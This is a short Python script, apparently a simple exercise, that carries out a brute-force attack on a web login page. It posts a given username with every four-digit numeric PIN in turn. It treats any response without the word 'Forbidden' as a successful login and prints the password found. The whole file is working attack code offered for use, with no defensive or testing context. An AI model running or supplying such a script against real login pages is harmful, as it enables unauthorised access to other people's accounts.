# Bruteforce
from string import ascii_letters, digits, punctuation
from itertools import product
import requests


# Function that sends a request to a login page
def send_request(url, username, password):
    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, data=data)

    return response


# Function that performs a Bruteforce attack against a login page
def bruteforce(url, username):
    for passcode in product(digits, repeat=4):
        passcode = "".join(passcode)
        response = send_request(url, username, passcode)
        if response.text.find("Forbidden") == -1:
            print(f"The correct password is: {passcode}")
            break
